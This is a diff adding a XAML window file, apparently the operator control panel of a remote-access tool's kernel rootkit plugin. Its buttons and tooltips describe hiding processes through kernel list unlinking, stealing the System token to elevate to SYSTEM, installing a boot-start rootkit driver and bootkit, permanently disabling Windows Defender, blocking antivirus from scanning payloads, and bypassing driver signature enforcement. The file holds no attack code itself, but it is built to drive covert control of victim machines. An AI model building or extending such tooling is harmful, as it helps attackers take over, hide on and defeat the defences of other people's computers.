@@ -1,0 +1,367 @@
+<Window x:Class="Pulsar.Plugin.Ring0.Server.RootkitWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        Title="Ring0 Control" 
+        Width="950" Height="850" MinHeight="700"
+        WindowStartupLocation="CenterScreen"
+        Background="#1E1E1E"
+        Foreground="#DCDCDC"
+        ResizeMode="CanResize">
+
+    <Window.Resources>
+        <!-- Dark Theme Colors -->
+        <SolidColorBrush x:Key="BgDark" Color="#1E1E1E"/>
+        <SolidColorBrush x:Key="BgPanel" Color="#2D2D30"/>
+        <SolidColorBrush x:Key="BgButton" Color="#3C3C41"/>
+        <SolidColorBrush x:Key="BgButtonHover" Color="#505055"/>
+        <SolidColorBrush x:Key="BgTextBox" Color="#252526"/>
+        <SolidColorBrush x:Key="BorderBrush" Color="#434346"/>
+        <SolidColorBrush x:Key="FgText" Color="#DCDCDC"/>
+        <SolidColorBrush x:Key="AccentBlue" Color="#007ACC"/>
+        <SolidColorBrush x:Key="SuccessGreen" Color="#57A64A"/>
+        <SolidColorBrush x:Key="ErrorRed" Color="#CF6679"/>
+        <SolidColorBrush x:Key="WarningYellow" Color="#DCA032"/>
+
+        <!-- Button Style -->
+        <Style x:Key="DarkButton" TargetType="Button">
+            <Setter Property="Background" Value="{StaticResource BgButton}"/>
+            <Setter Property="Foreground" Value="{StaticResource FgText}"/>
+            <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}"/>
+            <Setter Property="BorderThickness" Value="1"/>
+            <Setter Property="Padding" Value="15,8"/>
+            <Setter Property="Margin" Value="3"/>
+            <Setter Property="FontSize" Value="13"/>
+            <Setter Property="Cursor" Value="Hand"/>
+            <Setter Property="Template">
+                <Setter.Value>
+                    <ControlTemplate TargetType="Button">
+                        <Border Background="{TemplateBinding Background}" 
+                                BorderBrush="{TemplateBinding BorderBrush}" 
+                                BorderThickness="{TemplateBinding BorderThickness}"
+                                CornerRadius="3"
+                                Padding="{TemplateBinding Padding}">
+                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
+                        </Border>
+                        <ControlTemplate.Triggers>
+                            <Trigger Property="IsMouseOver" Value="True">
+                                <Setter Property="Background" Value="{StaticResource BgButtonHover}"/>
+                            </Trigger>
+                            <Trigger Property="IsEnabled" Value="False">
+                                <Setter Property="Opacity" Value="0.5"/>
+                            </Trigger>
+                        </ControlTemplate.Triggers>
+                    </ControlTemplate>
+                </Setter.Value>
+            </Setter>
+        </Style>
+
+        <!-- TextBox Style -->
+        <Style x:Key="DarkTextBox" TargetType="TextBox">
+            <Setter Property="Background" Value="{StaticResource BgTextBox}"/>
+            <Setter Property="Foreground" Value="{StaticResource FgText}"/>
+            <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}"/>
+            <Setter Property="BorderThickness" Value="1"/>
+            <Setter Property="Padding" Value="8,6"/>
+            <Setter Property="FontSize" Value="13"/>
+            <Setter Property="CaretBrush" Value="{StaticResource FgText}"/>
+        </Style>
+
+        <!-- ComboBox Item Style (for dropdown items) -->
+        <Style x:Key="DarkComboBoxItem" TargetType="ComboBoxItem">
+            <Setter Property="Background" Value="#252526"/>
+            <Setter Property="Foreground" Value="#DCDCDC"/>
+            <Setter Property="Padding" Value="8,6"/>
+            <Setter Property="BorderThickness" Value="0"/>
+            <Style.Triggers>
+                <Trigger Property="IsMouseOver" Value="True">
+                    <Setter Property="Background" Value="#3E3E42"/>
+                </Trigger>
+                <Trigger Property="IsSelected" Value="True">
+                    <Setter Property="Background" Value="#007ACC"/>
+                </Trigger>
+            </Style.Triggers>
+        </Style>
+
+        <!-- ComboBox Style with dark dropdown -->
+        <Style x:Key="DarkComboBox" TargetType="ComboBox">
+            <Setter Property="Background" Value="{StaticResource BgTextBox}"/>
+            <Setter Property="Foreground" Value="{StaticResource FgText}"/>
+            <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}"/>
+            <Setter Property="BorderThickness" Value="1"/>
+            <Setter Property="Padding" Value="8,6"/>
+            <Setter Property="FontSize" Value="13"/>
+            <Setter Property="ItemContainerStyle" Value="{StaticResource DarkComboBoxItem}"/>
+            <Setter Property="Template">
+                <Setter.Value>
+                    <ControlTemplate TargetType="ComboBox">
+                        <Grid>
+                            <ToggleButton x:Name="ToggleButton" 
+                                          Background="{StaticResource BgTextBox}"
+                                          BorderBrush="{StaticResource BorderBrush}"
+                                          BorderThickness="1"
+                                          Focusable="False"
+                                          IsChecked="{Binding IsDropDownOpen, Mode=TwoWay, RelativeSource={RelativeSource TemplatedParent}}"
+                                          ClickMode="Press">
+                                <ToggleButton.Template>
+                                    <ControlTemplate TargetType="ToggleButton">
+                                        <Border Background="{TemplateBinding Background}" 
+                                                BorderBrush="{TemplateBinding BorderBrush}" 
+                                                BorderThickness="{TemplateBinding BorderThickness}">
+                                            <Grid>
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition/>
+                                                    <ColumnDefinition Width="20"/>
+                                                </Grid.ColumnDefinitions>
+                                                <ContentPresenter Grid.Column="0"/>
+                                                <Path Grid.Column="1" Data="M0,0 L4,4 L8,0" 
+                                                      Fill="#DCDCDC" 
+                                                      HorizontalAlignment="Center" 
+                                                      VerticalAlignment="Center"/>
+                                            </Grid>
+                                        </Border>
+                                    </ControlTemplate>
+                                </ToggleButton.Template>
+                            </ToggleButton>
+                            <ContentPresenter x:Name="ContentSite"
+                                              Content="{TemplateBinding SelectionBoxItem}"
+                                              ContentTemplate="{TemplateBinding SelectionBoxItemTemplate}"
+                                              Margin="8,6,24,6"
+                                              VerticalAlignment="Center"
+                                              HorizontalAlignment="Left"
+                                              IsHitTestVisible="False"/>
+                            <Popup x:Name="Popup" 
+                                   Placement="Bottom"
+                                   IsOpen="{TemplateBinding IsDropDownOpen}"
+                                   AllowsTransparency="True"
+                                   Focusable="False"
+                                   PopupAnimation="Slide">
+                                <Border x:Name="DropDownBorder"
+                                        Background="#252526"
+                                        BorderBrush="#434346"
+                                        BorderThickness="1"
+                                        MinWidth="{TemplateBinding ActualWidth}"
+                                        MaxHeight="{TemplateBinding MaxDropDownHeight}">
+                                    <ScrollViewer Margin="0" SnapsToDevicePixels="True">
+                                        <StackPanel IsItemsHost="True" KeyboardNavigation.DirectionalNavigation="Contained"/>
+                                    </ScrollViewer>
+                                </Border>
+                            </Popup>
+                        </Grid>
+                    </ControlTemplate>
+                </Setter.Value>
+            </Setter>
+        </Style>
+
+        <!-- GroupBox Style -->
+        <Style x:Key="DarkGroupBox" TargetType="GroupBox">
+            <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}"/>
+            <Setter Property="BorderThickness" Value="1"/>
+            <Setter Property="Foreground" Value="{StaticResource FgText}"/>
+            <Setter Property="Margin" Value="5"/>
+            <Setter Property="Padding" Value="10"/>
+            <Setter Property="FontSize" Value="13"/>
+        </Style>
+
+        <!-- Label Style -->
+        <Style TargetType="Label">
+            <Setter Property="Foreground" Value="{StaticResource FgText}"/>
+            <Setter Property="FontSize" Value="13"/>
+            <Setter Property="VerticalAlignment" Value="Center"/>
+        </Style>
+    </Window.Resources>
+
+    <Grid Margin="15">
+        <Grid.RowDefinitions>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="*"/>
+        </Grid.RowDefinitions>
+
+        <!-- Status Panel -->
+        <Border Grid.Row="0" Background="{StaticResource BgPanel}" BorderBrush="{StaticResource BorderBrush}" 
+                BorderThickness="1" CornerRadius="5" Padding="20,15" Margin="0,0,0,10">
+            <Grid>
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="*"/>
+                    <ColumnDefinition Width="*"/>
+                    <ColumnDefinition Width="Auto"/>
+                </Grid.ColumnDefinitions>
+                <Grid.RowDefinitions>
+                    <RowDefinition Height="Auto"/>
+                    <RowDefinition Height="Auto"/>
+                    <RowDefinition Height="Auto"/>
+                </Grid.RowDefinitions>
+
+                <TextBlock x:Name="lblConnStatus" Grid.Column="0" Grid.Row="0" 
+                           Text="○ Rootkit Not Connected" FontSize="16" FontWeight="Bold" 
+                           Foreground="{StaticResource ErrorRed}"/>
+                <TextBlock x:Name="lblDriverStatus" Grid.Column="0" Grid.Row="1" 
+                           Text="Driver: Not Loaded" FontSize="13" Margin="0,5,0,0"/>
+                <TextBlock x:Name="lblBuildStatus" Grid.Column="0" Grid.Row="2" 
+                           Text="Build: Unknown" FontSize="13" Margin="0,5,0,0"/>
+
+                <TextBlock x:Name="lblDseStatus" Grid.Column="1" Grid.Row="0" 
+                           Text="DSE: Unknown" FontSize="14"/>
+                <TextBlock x:Name="lblSecureBootStatus" Grid.Column="1" Grid.Row="1" 
+                           Text="Secure Boot: Unknown" FontSize="13" Margin="0,5,0,0"/>
+                <TextBlock x:Name="lblCompatStatus" Grid.Column="1" Grid.Row="2" 
+                           Text="Compatibility: Unknown" FontSize="13" Margin="0,5,0,0"/>
+
+                <Button x:Name="btnCompatCheck" Grid.Column="2" Grid.RowSpan="3" 
+                        Content="Check&#x0a;Compatibility" Style="{StaticResource DarkButton}" 
+                        Width="100" Height="60" VerticalAlignment="Center" Margin="10,0,0,0"
+                        Click="BtnCompatCheck_Click"
+                        ToolTip="Check DSE, Secure Boot, and Windows build compatibility"/>
+            </Grid>
+        </Border>
+
+        <!-- Process Operations & Protection -->
+        <Grid Grid.Row="1" Margin="0,0,0,10">
+            <Grid.ColumnDefinitions>
+                <ColumnDefinition Width="*"/>
+                <ColumnDefinition Width="*"/>
+            </Grid.ColumnDefinitions>
+
+            <!-- Process Operations -->
+            <GroupBox Grid.Column="0" Header="Process Operations" Style="{StaticResource DarkGroupBox}" Margin="0,0,5,0">
+                <StackPanel>
+                    <Grid Margin="0,0,0,10">
+                        <Grid.ColumnDefinitions>
+                            <ColumnDefinition Width="60"/>
+                            <ColumnDefinition Width="*"/>
+                        </Grid.ColumnDefinitions>
+                        <Label Content="PID:" ToolTip="Process ID - enter the target process ID"/>
+                        <TextBox x:Name="txtPid" Grid.Column="1" Style="{StaticResource DarkTextBox}" Width="180" HorizontalAlignment="Left"
+                                 ToolTip="Enter the Process ID (PID) of the target process"/>
+                    </Grid>
+                    <WrapPanel>
+                        <Button x:Name="btnHideProcess" Content="Hide Process" Style="{StaticResource DarkButton}" Width="200" Click="BtnHideProcess_Click"
+                                ToolTip="Hides the process from Task Manager and other process enumeration tools by unlinking it from the kernel's process list (DKOM)"/>
+                        <Button x:Name="btnElevateProcess" Content="Elevate to SYSTEM" Style="{StaticResource DarkButton}" Width="200" Click="BtnElevateProcess_Click"
+                                ToolTip="Elevates the process to SYSTEM privileges by copying the token from the System process (PID 4)"/>
+                    </WrapPanel>
+                    <WrapPanel Margin="0,5,0,0">
+                        <Button x:Name="btnSpawnElevated" Content="Spawn Elevated CMD" Style="{StaticResource DarkButton}" Width="200" Click="BtnSpawnElevated_Click"
+                                ToolTip="Spawns a new cmd.exe process with SYSTEM privileges on the target machine"/>
+                        <Button x:Name="btnUnprotectAll" Content="Unprotect All Processes" Style="{StaticResource DarkButton}" Width="200" Click="BtnUnprotectAll_Click"
+                                ToolTip="Removes kernel-level protection from all processes, allowing them to be terminated or debugged normally"/>
+                    </WrapPanel>
+                </StackPanel>
+            </GroupBox>
+
+            <!-- Process Protection -->
+            <GroupBox Grid.Column="1" Header="Process Protection" Style="{StaticResource DarkGroupBox}" Margin="5,0,0,0"
+                      ToolTip="Apply Protected Process (PP/PPL) protection to make processes unkillable">
+                <Grid>
+                    <Grid.RowDefinitions>
+                        <RowDefinition Height="Auto"/>
+                        <RowDefinition Height="Auto"/>
+                        <RowDefinition Height="Auto"/>
+                    </Grid.RowDefinitions>
+                    <Grid.ColumnDefinitions>
+                        <ColumnDefinition Width="70"/>
+                        <ColumnDefinition Width="*"/>
+                        <ColumnDefinition Width="Auto"/>
+                    </Grid.ColumnDefinitions>
+
+                    <Label Content="PID:" Grid.Row="0" ToolTip="Process ID to protect"/>
+                    <TextBox x:Name="txtProtPid" Grid.Row="0" Grid.Column="1" Style="{StaticResource DarkTextBox}" Width="150" HorizontalAlignment="Left"
+                             ToolTip="Enter the Process ID (PID) of the process to protect"/>
+
+                    <Label Content="Type:" Grid.Row="1" ToolTip="Protection level"/>
+                    <ComboBox x:Name="cboProtType" Grid.Row="1" Grid.Column="1" Style="{StaticResource DarkComboBox}" Width="180" HorizontalAlignment="Left" Margin="0,5"
+                              ToolTip="None = Remove protection&#x0a;Light = Protected Process Light (PPL) - blocks most access&#x0a;Full = Protected Process (PP) - maximum protection, blocks even SYSTEM">
+                        <ComboBoxItem Content="None" ToolTip="Remove all protection from the process"/>
+                        <ComboBoxItem Content="Light" ToolTip="Protected Process Light - blocks termination, debugging, and memory access from non-protected processes"/>
+                        <ComboBoxItem Content="Full" ToolTip="Full Protected Process - maximum protection, even SYSTEM cannot access"/>
+                    </ComboBox>
+
+                    <Label Content="Signer:" Grid.Row="2" ToolTip="Simulated code signer - determines what other protected processes can interact with this one"/>
+                    <ComboBox x:Name="cboProtSigner" Grid.Row="2" Grid.Column="1" Style="{StaticResource DarkComboBox}" Width="180" HorizontalAlignment="Left"
+                              ToolTip="The signer determines the trust level:&#x0a;WinTcb = Highest trust (Windows core)&#x0a;Antimalware = For AV/EDR&#x0a;Windows = Standard Windows components">
+                        <ComboBoxItem Content="None" ToolTip="No signer - use with Type=None to remove protection"/>
+                        <ComboBoxItem Content="Authenticode" ToolTip="Standard signed code"/>
+                        <ComboBoxItem Content="CodeGen" ToolTip="Code generation/JIT"/>
+                        <ComboBoxItem Content="Antimalware" ToolTip="Antimalware/EDR level - protects against tampering"/>
+                        <ComboBoxItem Content="Lsa" ToolTip="Local Security Authority - credential protection"/>
+                        <ComboBoxItem Content="Windows" ToolTip="Windows component level"/>
+                        <ComboBoxItem Content="WinTcb" ToolTip="Windows Trusted Computing Base - highest trust"/>
+                        <ComboBoxItem Content="WinSystem" ToolTip="Windows System level"/>
+                        <ComboBoxItem Content="App" ToolTip="Application level"/>
+                    </ComboBox>
+
+                    <Button x:Name="btnSetProtection" Content="Set Protection" Grid.RowSpan="3" Grid.Column="2" 
+                            Style="{StaticResource DarkButton}" Width="140" Height="80" Margin="10,0,0,0" Click="BtnSetProtection_Click"
+                            ToolTip="Apply the selected protection level to the specified process. Use Type=None and Signer=None to remove protection."/>
+                </Grid>
+            </GroupBox>
+        </Grid>
+
+        <!-- File Operations -->
+        <GroupBox Grid.Row="2" Header="File Operations" Style="{StaticResource DarkGroupBox}" Margin="0,0,0,10"
+                  ToolTip="Kernel-level file protection operations on the target system">
+            <StackPanel>
+                <Grid Margin="0,0,0,10">
+                    <Grid.ColumnDefinitions>
+                        <ColumnDefinition Width="80"/>
+                        <ColumnDefinition Width="*"/>
+                        <ColumnDefinition Width="110"/>
+                        <ColumnDefinition Width="100"/>
+                    </Grid.ColumnDefinitions>
+                    <Label Content="File Path:" ToolTip="Full path to the file on the TARGET system"/>
+                    <TextBox x:Name="txtFilename" Grid.Column="1" Style="{StaticResource DarkTextBox}" Margin="0,0,5,0"
+                             ToolTip="Enter the full file path on the TARGET system (e.g., C:\Windows\malware.exe)"/>
+                    <Label Content="Allowed PID:" Grid.Column="2" 
+                           ToolTip="Process ID allowed to access the file when restricted"/>
+                    <TextBox x:Name="txtAllowedPid" Grid.Column="3" Style="{StaticResource DarkTextBox}"
+                             ToolTip="When restricting file access, only this PID can access the file. Leave empty or 0 to block all access."/>
+                </Grid>
+                <WrapPanel>
+                    <Button x:Name="btnRestrictFile" Content="Restrict File Access" Style="{StaticResource DarkButton}" Width="200" Click="BtnRestrictFile_Click"
+                            ToolTip="Blocks all processes from accessing this file except the Allowed PID. Useful for protecting payloads from AV scanning."/>
+                    <Button x:Name="btnBypassIntegrity" Content="Bypass Integrity Check" Style="{StaticResource DarkButton}" Width="220" Click="BtnBypassIntegrity_Click"
+                            ToolTip="Removes Windows File Protection (WFP) integrity checks for this file, allowing modification of protected system files."/>
+                    <Button x:Name="btnProtectAV" Content="Protect File Against AV" Style="{StaticResource DarkButton}" Width="220" Click="BtnProtectAV_Click"
+                            ToolTip="Prevents antivirus/EDR from scanning or accessing this file by blocking their file access requests at the kernel level."/>
+                </WrapPanel>
+            </StackPanel>
+        </GroupBox>
+
+        <!-- Driver Operations -->
+        <GroupBox Grid.Row="3" Header="Driver Operations" Style="{StaticResource DarkGroupBox}" Margin="0,0,0,10"
+                  ToolTip="Manage the kernel driver installation and connection">
+            <StackPanel>
+                <WrapPanel HorizontalAlignment="Center">
+                    <Button x:Name="btnConnect" Content="Connect" Style="{StaticResource DarkButton}" Width="130" Click="BtnConnect_Click"
+                            ToolTip="Connect to an already loaded driver. Use this if the driver is running but not connected."/>
+                    <Button x:Name="btnInstall" Content="Install Rootkit" Style="{StaticResource DarkButton}" Width="130" Click="BtnInstall_Click"
+                            ToolTip="Install the rootkit driver and bootkit. Requires admin privileges. Will set up BOOT_START service and Elysium bootkit."/>
+                    <Button x:Name="btnUninstall" Content="Uninstall" Style="{StaticResource DarkButton}" Width="130" Click="BtnUninstall_Click"
+                            ToolTip="Uninstall the rootkit driver, remove the bootkit, and clean up all persistence. Restores original boot manager."/>
+                    <Button x:Name="btnRefresh" Content="Refresh Status" Style="{StaticResource DarkButton}" Width="130" Click="BtnRefresh_Click"
+                            ToolTip="Refresh the connection status and check if the driver is loaded and responsive."/>
+                </WrapPanel>
+                <WrapPanel HorizontalAlignment="Center" Margin="0,5,0,0">
+                    <Button x:Name="btnDisableDefender" Content="Disable Defender" Style="{StaticResource DarkButton}" Width="160" Click="BtnDisableDefender_Click"
+                            ToolTip="Permanently disable Windows Defender using kernel privileges. Kills Defender processes and disables services."/>
+                    <Button x:Name="btnSwapDriver" Content="Swap MS Driver" Style="{StaticResource DarkButton}" Width="160" Click="BtnSwapDriver_Click"
+                            ToolTip="Swap a legitimate Microsoft driver certificate to bypass DSE. Advanced technique - use with caution."/>
+                </WrapPanel>
+            </StackPanel>
+        </GroupBox>
+
+        <!-- Log -->
+        <GroupBox Grid.Row="4" Header="Log" Style="{StaticResource DarkGroupBox}" MinHeight="180">
+            <TextBox x:Name="txtLog" Style="{StaticResource DarkTextBox}" 
+                     IsReadOnly="True" 
+                     TextWrapping="Wrap" 
+                     VerticalScrollBarVisibility="Auto"
+                     FontFamily="Consolas"
+                     FontSize="12"
+                     MinHeight="140"
+                     AcceptsReturn="True"/>
+        </GroupBox>
+    </Grid>
+</Window>
